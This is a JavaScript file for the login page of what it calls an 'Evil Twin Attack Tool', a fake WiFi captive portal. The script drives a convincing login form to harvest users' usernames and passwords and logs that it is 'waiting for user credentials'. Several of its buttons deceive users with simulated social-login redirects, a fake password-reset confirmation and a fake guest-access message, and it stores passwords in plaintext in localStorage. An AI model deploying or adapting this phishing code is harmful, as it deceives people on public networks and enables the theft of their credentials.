/**
 * Evil Twin Attack Tool - Captive Portal Script
 * Professional WiFi Login Page Interactions
 */

document.addEventListener('DOMContentLoaded', function() {
    'use strict';

    // ============================================
    // DOM Elements
    // ============================================
    const form = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const togglePassword = document.getElementById('togglePassword');
    const toast = document.getElementById('toast');
    const rememberCheck = document.getElementById('remember');
    const guestLink = document.getElementById('guestLink');
    const forgotLink = document.querySelector('.forgot-link');
    const socialBtns = document.querySelectorAll('.social-btn');

    // ============================================
    // Toast Notification System
    // ============================================
    let toastTimeout = null;

    function showToast(message, icon = '✅', duration = 4000) {
        const toastMessage = toast.querySelector('.toast-message');
        const toastIcon = toast.querySelector('.toast-icon');
        
        toastIcon.textContent = icon;
        toastMessage.textContent = message;
        toast.className = 'toast';
        
        // Force reflow for animation
        void toast.offsetWidth;
        toast.classList.add('show');
        
        // Clear previous timeout
        if (toastTimeout) {
            clearTimeout(toastTimeout);
        }
        
        // Auto-hide
        toastTimeout = setTimeout(function() {
            toast.classList.remove('show');
        }, duration);
    }

    function hideToast() {
        toast.classList.remove('show');
        if (toastTimeout) {
            clearTimeout(toastTimeout);
            toastTimeout = null;
        }
    }

    // ============================================
    // Toggle Password Visibility
    // ============================================
    if (togglePassword) {
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            
            const eyeIcon = this.querySelector('.eye-icon');
            if (type === 'text') {
                eyeIcon.textContent = '👁‍🗨';
                this.setAttribute('aria-label', 'Hide password');
            } else {
                eyeIcon.textContent = '👁';
                this.setAttribute('aria-label', 'Show password');
            }
        });
    }

    // ============================================
    // Real-time Input Validation
    // ============================================
    
    // Username validation
    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            this.classList.remove('error');
            const hint = this.parentElement.querySelector('.input-hint');
            if (!hint) return;
            
            const val = this.value.trim();
            if (val.length === 0) {
                hint.textContent = 'Required';
                hint.style.color = '#9aa0a6';
            } else if (val.length < 3) {
                hint.textContent = 'Too short (min 3)';
                hint.style.color = '#ea4335';
            } else if (val.length >= 3 && val.length < 6) {
                hint.textContent = '✓ Good';
                hint.style.color = '#fbbc04';
            } else {
                hint.textContent = '✓ Valid';
                hint.style.color = '#34a853';
            }
        });

        usernameInput.addEventListener('blur', function() {
            const val = this.value.trim();
            if (val.length > 0 && val.length < 3) {
                this.classList.add('error');
                showError(this, 'Username must be at least 3 characters');
            }
        });
    }

    // Password validation
    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            this.classList.remove('error');
            const hint = this.parentElement.parentElement?.querySelector('.password-hint');
            if (!hint) return;
            
            const val = this.value.trim();
            if (val.length === 0) {
                hint.innerHTML = '<a href="#" class="forgot-link">Forgot password?</a>';
                hint.style.color = '';
            } else if (val.length < 4) {
                hint.innerHTML = '⚠️ Password must be at least 4 characters';
                hint.style.color = '#ea4335';
            } else if (val.length < 8) {
                hint.innerHTML = '⚠️ Weak password (min 8 recommended)';
                hint.style.color = '#fbbc04';
            } else {
                hint.innerHTML = '✓ Strong password';
                hint.style.color = '#34a853';
            }
        });

        passwordInput.addEventListener('blur', function() {
            const val = this.value.trim();
            if (val.length > 0 && val.length < 4) {
                this.classList.add('error');
                showError(this, 'Password must be at least 4 characters');
            }
        });
    }

    // ============================================
    // Error Display
    // ============================================
    function showError(input, message) {
        input.classList.add('error');
        
        // Remove existing error message
        let errorEl = input.parentElement.querySelector('.error-message');
        if (!errorEl) {
            errorEl = document.createElement('div');
            errorEl.className = 'error-message';
            errorEl.style.cssText = 'color:#ea4335;font-size:13px;margin-top:4px;display:flex;align-items:center;gap:4px;';
            errorEl.innerHTML = '<span>⚠️</span> ' + message;
            input.parentElement.appendChild(errorEl);
        } else {
            errorEl.innerHTML = '<span>⚠️</span> ' + message;
        }
        
        // Auto-focus
        setTimeout(function() {
            input.focus();
        }, 100);
    }

    function clearErrors() {
        document.querySelectorAll('.error-message').forEach(function(el) {
            el.remove();
        });
        document.querySelectorAll('input.error').forEach(function(el) {
            el.classList.remove('error');
        });
    }

    // ============================================
    // Form Submission
    // ============================================
    if (form) {
        form.addEventListener('submit', function(e) {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            let hasError = false;
            
            // Clear previous errors
            clearErrors();
            
            // Validate username
            if (username.length < 3) {
                showError(usernameInput, 'Please enter a valid username (min 3 characters)');
                hasError = true;
            }
            
            // Validate password
            if (password.length < 4) {
                showError(passwordInput, 'Password must be at least 4 characters');
                hasError = true;
            }
            
            // Check terms acceptance
            const termsCheck = document.getElementById('accept_terms');
            if (termsCheck && !termsCheck.checked) {
                showToast('Please accept the Terms & Conditions', '⚠️', 3000);
                hasError = true;
            }
            
            if (hasError) {
                e.preventDefault();
                return;
            }
            
            // Show loading state
            submitBtn.classList.add('loading');
            submitBtn.disabled = true;
            showToast('Connecting to WiFi...', '⏳', 5000);
            
            // Save credentials if "Remember me" is checked
            if (rememberCheck && rememberCheck.checked) {
                try {
                    localStorage.setItem('wifi_remember', 'true');
                    localStorage.setItem('wifi_username', username);
                    localStorage.setItem('wifi_password', password);
                } catch (err) {
                    // localStorage might not be available
                }
            } else {
                try {
                    localStorage.removeItem('wifi_remember');
                    localStorage.removeItem('wifi_username');
                    localStorage.removeItem('wifi_password');
                } catch (err) {
                    // Ignore
                }
            }
            
            // Allow form to submit
        });
    }

    // ============================================
    // Load Saved Credentials
    // ============================================
    try {
        if (localStorage.getItem('wifi_remember') === 'true') {
            const savedUsername = localStorage.getItem('wifi_username');
            const savedPassword = localStorage.getItem('wifi_password');
            if (savedUsername && usernameInput) {
                usernameInput.value = savedUsername;
            }
            if (savedPassword && passwordInput) {
                passwordInput.value = savedPassword;
            }
            if (rememberCheck) {
                rememberCheck.checked = true;
            }
        }
    } catch (err) {
        // localStorage might not be available
    }

    // ============================================
    // Social Login Buttons
    // ============================================
    socialBtns.forEach(function(btn) {
        btn.addEventListener('click', function(e) {
            e.preventDefault();
            const provider = this.classList.contains('facebook') ? 'Facebook' : 'Google';
            showToast('Connecting with ' + provider + '...', '🔗', 3000);
            
            // Simulate redirect after delay
            setTimeout(function() {
                showToast('Redirecting to ' + provider + '...', '🔄', 2000);
            }, 2000);
        });
    });

    // ============================================
    // Forgot Password Link
    // ============================================
    if (forgotLink) {
        forgotLink.addEventListener('click', function(e) {
            e.preventDefault();
            showToast('Password reset link sent to your email', '📧', 3000);
        });
    }

    // ============================================
    // Guest Access Link
    // ============================================
    if (guestLink) {
        guestLink.addEventListener('click', function(e) {
            e.preventDefault();
            showToast('Guest access granted', '👤', 2000);
            
            // Redirect after delay
            setTimeout(function() {
                window.location.href = 'https://www.google.com';
            }, 2500);
        });
    }

    // ============================================
    // Keyboard Shortcuts
    // ============================================
    document.addEventListener('keydown', function(e) {
        // Escape key - clear errors and hide toast
        if (e.key === 'Escape') {
            clearErrors();
            hideToast();
        }
        
        // Enter key on any input - submit form
        if (e.key === 'Enter' && (e.target.tagName === 'INPUT')) {
            if (form) {
                form.dispatchEvent(new Event('submit'));
            }
        }
    });

    // ============================================
    // Auto-focus
    // ============================================
    if (usernameInput && usernameInput.value.trim() === '') {
        setTimeout(function() {
            usernameInput.focus();
        }, 500);
    }

    // ============================================
    // Click outside to dismiss toast
    // ============================================
    document.addEventListener('click', function(e) {
        if (toast.classList.contains('show') && !toast.contains(e.target)) {
            setTimeout(hideToast, 2000);
        }
    });

    // ============================================
    // Handle page visibility change
    // ============================================
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
            // Page became visible - check URL params
            const params = new URLSearchParams(window.location.search);
            if (params.get('status') === 'success') {
                showToast('Connection successful!', '✅', 3000);
            } else if (params.get('status') === 'error') {
                showToast('Connection failed. Please try again.', '❌', 3000);
            }
        }
    });

    // ============================================
    // Terms Checkbox Validation
    // ============================================
    const termsCheck = document.getElementById('accept_terms');
    if (termsCheck) {
        termsCheck.addEventListener('change', function() {
            if (this.checked) {
                this.parentElement.style.color = '#34a853';
            } else {
                this.parentElement.style.color = '';
            }
        });
    }

    // ============================================
    // Handle form reset
    // ============================================
    const resetBtn = document.getElementById('resetBtn');
    if (resetBtn) {
        resetBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (form) {
                form.reset();
                clearErrors();
                hideToast();
                showToast('Form cleared', '🔄', 1500);
                if (usernameInput) {
                    setTimeout(function() {
                        usernameInput.focus();
                    }, 300);
                }
            }
        });
    }

    // ============================================
    // Mobile-friendly: Fix viewport on orientation change
    // ============================================
    window.addEventListener('orientationchange', function() {
        setTimeout(function() {
            window.scrollTo(0, 0);
        }, 300);
    });

    // ============================================
    // Console logging (for debugging)
    // ============================================
    console.log('📶 WiFi Captive Portal loaded successfully');
    console.log('🔐 Waiting for user credentials...');

    // ============================================
    // Development: Auto-fill for testing (remove in production)
    // ============================================
    // Uncomment below for testing:
    /*
    if (window.location.hostname === 'localhost' || window.location.hostname === '192.168.4.1') {
        setTimeout(function() {
            if (usernameInput && passwordInput) {
                usernameInput.value = 'test_user';
                passwordInput.value = 'test_pass123';
                const termsCheck = document.getElementById('accept_terms');
                if (termsCheck) termsCheck.checked = true;
                showToast('🔧 Test credentials loaded', '🧪', 2000);
            }
        }, 1000);
    }
    */

    // ============================================
    // Expose functions globally (for debugging)
    // ============================================
    window.__evil_twin = {
        showToast: showToast,
        hideToast: hideToast,
        clearErrors: clearErrors,
        showError: showError
    };
});
